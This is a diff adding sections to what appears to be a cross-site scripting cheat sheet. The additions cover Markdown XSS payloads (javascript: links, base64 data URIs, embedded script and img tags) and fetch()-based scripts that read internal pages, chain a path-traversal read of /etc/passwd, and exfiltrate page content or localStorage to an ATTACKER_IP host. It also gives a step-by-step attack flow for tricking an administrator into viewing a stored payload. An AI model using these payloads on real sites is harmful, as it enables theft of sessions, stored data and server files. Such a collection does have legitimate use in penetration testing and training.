@@ -21,9 +21,10 @@
 ### Alternatives (if alert blocked)
 
 ```html
-<plaintext>
-<script>print()</script>
-<img src=x onerror=alert(1)>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
 ```
 
 ### DOM XSS (when script tags blocked)
@@ -308,6 +309,94 @@ new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
 <video><source onerror=alert(1)>
 <audio src=x onerror=alert(1)>
 <details open ontoggle=alert(1)>
+```
+
+---
+
+## XSS in Markdown
+
+Markdown parsers that allow HTML can be vulnerable to XSS.
+
+### Markdown XSS Payloads
+
+```markdown
+[Click me](javascript:alert(1))
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+```
+
+### Embedded HTML in Markdown
+
+```markdown
+### Title
+<script>alert(1)</script>
+
+### Image payload
+<img src=x onerror=alert(1)>
+```
+
+**Reference:** https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt
+
+---
+
+## XSS Data Exfiltration via fetch()
+
+Exfiltrate internal page content when no cookies are available.
+
+### Exfiltrate Page Content
+
+```html
+<script>
+fetch('http://TARGET/internal-page.php')
+.then(resp => resp.text())
+.then(body => {
+    fetch("http://ATTACKER_IP/exfil?body=" + btoa(body));
+})
+</script>
+```
+
+### Exfiltrate via LFI Parameter
+
+If the target has an LFI vulnerability accessible from XSS context:
+
+```html
+<script>
+fetch('http://TARGET/messages.php?file=../../../../etc/passwd')
+.then(resp => resp.text())
+.then(body => {
+    fetch("http://ATTACKER_IP/exfil?body=" + btoa(body));
+})
+</script>
+```
+
+### Decode Exfiltrated Data
+
+```bash
+# Listener receives base64 encoded data
+# GET /exfil?body=PHByZT5hbGJlcnQ6JGFwcjEk...
+
+# Decode
+echo "PHByZT5hbGJlcnQ6JGFwcjEk..." | base64 -d
+```
+
+### Attack Flow (Stored XSS + LFI Chain)
+
+1. Upload malicious markdown/content with XSS payload
+2. Get shareable link to stored content
+3. Send link to admin via contact form
+4. Admin views link, XSS executes
+5. Fetch internal page content (messages, config files)
+6. Exfiltrate via base64 to attacker server
+7. Chain with LFI to read sensitive files (Apache config, .htpasswd)
+
+### Exfiltrate localStorage
+
+```html
+<script>
+new Image().src='http://ATTACKER_IP/steal.php?c='+btoa(JSON.stringify(localStorage));
+</script>
 ```
 
 
